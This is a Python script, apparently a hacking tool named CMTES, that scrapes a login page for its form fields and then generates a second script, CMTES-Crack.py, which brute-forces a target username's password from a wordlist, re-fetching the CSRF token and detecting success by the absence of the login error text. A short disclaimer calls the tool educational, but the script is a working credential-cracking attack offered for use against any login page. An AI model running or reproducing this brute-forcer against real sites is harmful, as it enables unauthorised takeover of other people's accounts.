from time import sleep
from sys import stdout,stdin

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'

def animate_write(text, color, duration):
    for char in text:
        stdout.write(color + char)
        stdout.flush()
        sleep(duration)

try:
	from requests import get
except:
	animate_write(f'"{lrd}[{rd}-{lrd}] {rd}Request" module is not installed, please install it with the command below 👇🏻\n\npip install requests', rd, 0.1)
from bs4 import BeautifulSoup
from platform import uname
from os import system

def animate_erase(text, color, duration):
    for _ in text:
        stdout.write('\b \b')
        stdout.flush()
        sleep(duration)
        
def clear():
	if 'Windows' in uname():
		try:from colorama import init
		except:system("pip install colorama")
		system("cls")
	elif 'Windows' not in uname():
		system("clear")
		
clear()	
try:	
    def rotate_slash():
        for i in range(0,10):
            stdout.write('\r/   Finding variables')
            sleep(0.1)
            stdout.flush()
            stdout.write('\r-    Finding variables')
            sleep(0.1)
            stdout.flush()
            stdout.write('\r\\   Finding variables')
            sleep(0.1)
            stdout.flush()
            stdout.write('\r|   Finding variables')
            sleep(0.1)
            stdout.flush()
except:
     pass
animate_write("""                                 .__                  
__  _  _______   _______   ____  |__|  ____     ____  
\ \/ \/ /\__  \  \_  __ \ /    \ |  | /    \   / ___\ 
 \     /  / __ \_ |  | \/|   |  \|  ||   |  \ / /_/  >
  \/\_/  (____  / |__|   |___|  /|__||___|  / \___  / 
              \/              \/          \/ /_____/  
                             ! Warning !

""", lrd, 0.01)
animate_write("[!] Any crime committed using this tool is the responsibility of the person himself!\n\n[!] This tool is educational, so please do not violate\n\n",yw,0.05)
sleep(0.5)
animate_write("My Channel Telegram : @esfelurm",lgn,0.08)
sleep(0.5)
animate_erase("My Channel Telegram : @esfelurm",lgn,0.05)
animate_write("My Github : https://github.com/esfelurm",lgn,0.08)
sleep(0.5)
animate_erase("My Github : https://github.com/esfelurm",lgn,0.05)
animate_write("Version CMTES : 0.0.1 => (free)",lgn,0.05)
sleep(0.5)
animate_erase("Version CMTES : 0.0.1 => (free)",lgn,0.05)
sleep(3)
clear()

     
url = input(f"""{k}
             _   .-')     .-') _       ('-.     .-')    
            ( '.( OO )_  (  OO) )    _(  OO)   ( OO ).  
   .-----.   ,--.   ,--.)/     '._  (,------. (_)---\_) 
  '  .--./   |   `.'   | |'--...__)  |  .---' /    _ |  
  |  |('-.   |         | '--.  .--'  |  |     \  :` `.  
 /_) |OO  )  |  |'.'|  |    |  |    (|  '--.   '..`''.) 
 ||  |`-'|   |  |   |  |    |  |     |  .--'  .-._)   \ 
(_'  '--'\   |  |   |  |    |  |     |  `---. \       / 
   `-----'   `--'   `--'    `--'     `------'  `-----'  
 \n\n 
            {cn}Version : 0.0.1\n
            {gn}Channel Telegram : {lgn}@Esfelurm {lrd}< {yw}|||| {lrd}> {lgn}Github : {lgn}https://github.com/esfelurm\n\n
        {lrd}[{lgn}?{lrd}] {gn}Enter the address of the login page : {cn}""")

try:
    print (f'{yw}')
    rotate_slash()
except KeyboardInterrupt:
    pass
clear()
animate_write("""
.----. .-.  .-. .-----. .----.  .----. 
| }`-' }  \/  { `-' '-' } |__} { {__-` 
| },-. | {  } |   } {   } '__} .-._} } 
`----' `-'  `-'   `-'   `----' `----'  
""",pe,0.01)
content = get(url)
soup = BeautifulSoup(content.text, "html.parser")
tag_counts = {}
tags = soup.find_all()
for tag in tags:
    tag_name = tag.name
    if tag_name in tag_counts:
        tag_counts[tag_name] += 1
    else:
        tag_counts[tag_name] = 1

soup2 = BeautifulSoup(content.content, "html.parser")
name_elements = soup2.find_all(attrs={"name": True})
id_elements = soup2.find_all(attrs={"id": True})
input_tags = soup.find_all("input")
print (f"\n\n{pe}+++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n{gn} \n{yw}=================================================\n{gn}List Tags Html in source :\n\n")
for tag_name, count in tag_counts.items():
    print(f"    {lrd}[{yw}={lrd}] {g}Tag name : {k}{tag_name} {lgn}==> {g}Number of consumption : {k}{count}")
print (f'{yw}=================================================')
print (f"\n{gn}List Variables in source Html : \n\n")
for element in name_elements:
    print(f'    {lrd}[{gn}%{lrd}] {gn}Variable Name : {k}{element["name"]}')
print (f'{yw}=================================================')
print (f"\n{gn}List Variables ID in source Html : \n\n")
for element in id_elements:
    print(f'    {lrd}[{gn}~{lrd}] {g}variable ID : {k}{element["id"]}')
print (f'{yw}=================================================')

print (f"\n{gn}List Variables , from Login to account : \n\n")
for input_tag in input_tags:
    print(f"\n    {lrd}[{lgn}+{lrd}] {lgn}Variable name : {cn}{input_tag.get('name')}")
    try:
            print (f"    {lrd}[{lgn}+{lrd}] {lgn}Variable content : {cn}{input_tag.get('value')}")
            print (f"    {lrd}[{lgn}+{lrd}] {lgn}Code : {cn}{input_tag}")
    except:
            print (f"{lrd}[{rd}-{lrd}] {rd}Variable content : {lrd}None")

VUsername = input(f"\n{yw}=================================================\n\n{pe}+++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n{lrd}[{lgn}?{lrd}] {gn}Enter the variable that takes the value of the user : {yw}")
VPassword = input(f"\n{lrd}[{lgn}?{lrd}] {gn}Enter the variable that takes the password : {yw}")
token = input(f"\n{lrd}[{lgn}?{lrd}] {gn}Enter the variable that creates the token : {yw}")
sub = input(f"\n{lrd}[{lgn}?{lrd}] {gn}Submit the variable that hits submit : {yw}")
sub2 = input(f"\n{lrd}[{lgn}?{lrd}] {gn}Enter the text that is set for submit :{yw} ")
Error = input(f"\n{lrd}[{lgn}?{lrd}] {gn}Please enter the wrong password on the login page, copy the error text and give it to me : {yw}")
animate_write("[+] Making a cracker tool for you ...",lgn,0.05)
with open("CMTES-Crack.py",'w') as file:
    file.write(f"""#The author of this program on Telegram channel : @esfelurm
from bs4 import BeautifulSoup
from requests import post,get
            
passwd = input("Password List File : ")
user = input("Target Username : ")
            
info = BeautifulSoup(get('{url}').text, 'html.parser')
token = info.find("input",{{"name":'{token}'}})['value']
for password in open(passwd,'r').read().split():
    payload = {{'{token}':token,'{VUsername}':user,'{VPassword}':password}}
    req = post('{url}',data=payload).text

    if '{Error}' not in req:
        print (f"\033[01;32mTrue ! \033[01;33mPassword : \033[01;32m", password)
        exit()

    if '{Error}' in req:
        print (f"\033[01;31mFalse ! password : \033[01;31m",password)		
            
""")
animate_erase("[+] Making a cracker tool for you ...",lgn,0.05)
sleep(1)
animate_write("[+] The construction is completed ! file : CMTES-Crack.py\n\nbe successful and victorious ! \nChannel : @Esfelurm",lgn,0.05)


#END V 0.0.1 < ||| > @ESFElurm